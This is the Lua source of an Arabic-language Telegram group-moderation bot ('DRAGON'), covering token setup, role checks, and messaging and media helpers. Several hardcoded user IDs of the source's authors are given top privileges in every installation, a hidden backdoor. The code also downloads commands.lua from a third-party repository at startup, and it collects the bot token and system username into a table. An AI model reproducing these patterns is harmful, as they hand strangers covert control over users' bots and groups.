redis = require('redis') 
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
utf8 = require ('lua-utf8') 
database = redis.connect('127.0.0.1', 6379) 
id_server = io.popen("echo $SSH_CLIENT ♤ awk '{ print $1}'"):read('*a')
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not database:get(id_server..":token") then
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
end 
else
print('\27[0;35m⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n27[0;39;49m')
database:set(id_server..":SUDO:ID",SUDOID)
else
print('\27[0;31m⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 

io.write('\27[1;31m ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظ معرف المطور :')
end 
os.execute('lua DRAGON.lua')
end
local create_config_auto = function()
config = {
botUserName = database:get(id_server..":token_username"),
token = database:get(id_server..":token"),
SUDO = database:get(id_server..":SUDO:ID"),
UserName = database:get(id_server..":SUDO:USERNAME"),
 }
create(config, "./kkkklInfo.lua")   
end 
infotnseb = {}
infotnseb.id = database:get(id_server..":SUDO:ID")
infotnseb.username = database:get(id_server..":SUDO:USERNAME")
infotnseb.tokenbot = database:get(id_server..":token")
infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeee ennnnnnnddddddd :')
create_config_auto()
botUserName = database:get(id_server..":token_username")
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
UserName = database:get(id_server..":SUDO:USERNAME")
install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("DRAGON", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DRAGON
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺"
echo "TG IS NOT FIND IN FILES BOT"
echo "⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺"
exit 1
fi
if [ ! $token ]; then
echo "⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE kkkklInfo.lua \e[0m"
echo "⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺"
exit 1
fi
echo -e "\033[38;5;208m"
echo -e "                                                  "
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./DRAGON.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DRAGON
while(true) do
rm -fr ../.telegram-cli
screen -S DRAGON -X kill
screen -S DRAGON ./DRAGON
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./kkkklInfo.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
database:del(id_server..":token")
database:del(id_server..":SUDO:ID")
end  
local config = loadfile("./kkkklInfo.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
print([[
      ___           ___       ___           ___       ___           ___     
     /\  \         /\__\     /\__\         /\__\     /\  \         /\__\    
    /::\  \       /:/  /    /::|  |       /:/  /    /::\  \       /:/  /    
   /:/\:\  \     /:/  /    /:|:|  |      /:/  /    /:/\:\  \     /:/__/     
  /::\~\:\  \   /:/  /    /:/|:|__|__   /:/  /    /:/  \:\  \   /::\__\____ 
 /:/\:\ \:\__\ /:/__/    /:/ |::::\__\ /:/__/    /:/__/ \:\__\ /:/\:::::\__\
 \:\~\:\ \/__/ \:\  \    \/__/~~/:/  / \:\  \    \:\  \ /:/  / \/_|:|~~|~   
  \:\ \:\__\    \:\  \         /:/  /   \:\  \    \:\  /:/  /     |:|  |    
   \:\ \/__/     \:\  \       /:/  /     \:\  \    \:\/:/  /      |:|  |    
    \:\__\        \:\__\     /:/  /       \:\__\    \::/  /       |:|  |    
     \/__/         \/__/     \/__/         \/__/     \/__/         \|__|    

                                    
> CH ♤ ♤@eLmLoK0♤
~> DEVELOPER ♤ {text = @ttimo_8lby
]])
sudos = dofile("./kkkklInfo.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO}
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/JAPWA/STORM/main/File_Bot/commands.lua") 
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
sudo_users = {SUDO,2002118176,2038767028,2094348305,1965534755,}
function SudoBot(msg)  
local DRAGON = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
DRAGON = true  
end  
end  
return DRAGON  
end 
function DevSoFi(msg) 
local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
end  
end
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function Sudo(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
end
function CoSu(msg)
local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function BasicConstructor(msg)
local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Manager(msg)
local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function onall(msg)
local hash = database:sismember(bot_id..'onall'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function cleaner(msg)
local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Mod(msg)
local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Special(msg)
local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
end
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(2002118176) then  
var = true
elseif tonumber(user_id) == tonumber(2038767028) then
var = true
elseif tonumber(user_id) == tonumber(2094348305) then
var = true
elseif tonumber(user_id) == tonumber(1965534755) then
var = true
elseif tonumber(user_id) == tonumber(2078351596) then
var = true
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = true  
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = true  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Biasic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = true  
elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(2002118176) then  
var = 'المبرمج تيمو'
elseif tonumber(user_id) == tonumber(2038767028) then
var = 'مبرمج ابو المجد'
elseif tonumber(user_id) == tonumber(2094348305) then
var = 'مالك السورس عمر'
elseif tonumber(user_id) == tonumber(1965534755) then
var = 'مبرمج جابوا'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = "المطور الثانوي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'صاحب الروم'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ الاساسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ'  
elseif database:sismember(bot_id..'onall'..chat_id, user_id) then
var = database:get(bot_id.."onall:Rd"..msg.chat_id_) or 'المدير العام'
elseif database:sismember(bot_id..'moall'..chat_id, user_id) then
var = database:get(bot_id.."moall:Rd"..msg.chat_id_) or 'الادمن العام'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير'  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'االادمن'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'عضو'
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_User(Chat_id,User_id) 
if database:sismember(bot_id..'Muted:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_User(Chat_id,User_id) 
if database:sismember(bot_id..'Ban:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function GBan_User(User_id) 
if database:sismember(bot_id..'GBan:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function getcustom(msg,scc)
local var = "لايوجد"
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..scc.sender_user_id_)
GeId = JSON.decode(Ge)
if GeId.result.custom_title then
var = GeId.result.custom_title
end
return var
end
function getbio(User)
local var = "لايوجد"
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchat?chat_id="..User)
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function AddChannel(User)
local var = true
if database:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end

function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function chat_kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
local function Send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "eLmLoK0")
local NameUser = " ♤  مـن قبـل  ⇦♤["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = " ♤ اسم المستخدم  ⇦♤["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_," ♤ الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
function Total_Msg(msgs)  
local DRAGON_Msg = ''  
if msgs < 100 then 
DRAGON_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
DRAGON_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
DRAGON_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
DRAGON_Msg = 'متفاعل' 
elseif msgs < 1200 then 
DRAGON_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
DRAGON_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
DRAGON_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
DRAGON_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
DRAGON_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
DRAGON_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
DRAGON_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
DRAGON_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
DRAGON_Msg = 'رب التفاعل'  
end 
return DRAGON_Msg 
end
function Get_Info(msg,chat,user) 
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
Send(msg.chat_id_,msg.id_,'\n ♤ صاحب الخرابه')   
return false  end 
if Json_Info.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n ♤ عضو قميل')   
return false  end
if Json_Info.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n ♤ الشخص غير موجود هنا ')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔'
else
info = '❌'
end
if Json_Info.result.can_delete_messages == true then
delete = '✔'
else
delete = '❌'
end
if Json_Info.result.can_invite_users == true then
invite = '✔'
else
invite = '❌'
end
if Json_Info.result.can_pin_messages == true then
pin = '✔'
else
pin = '❌'
end
if Json_Info.result.can_restrict_members == true then
restrict = '✔'
else
restrict = '❌'
end
if Json_Info.result.can_promote_members == true then
promote = '✔'
else
promote = '❌'
end
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ \n━━━━━━━━━━'..'\n- تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'DRAGON Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"DRAGON":"'..NAME..'",'
else
t = t..',"'..v..'":{"DRAGON":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد جروبات التي في البوت { '..#list..'}')
end
function download_to_file(url, file_path) 
local respjoker = {} 
local options = { url = url, sink = ltn12.sink.table(respjoker), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respjoker)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,'./'..File_Name,'تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, './'..ty)   
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°")  
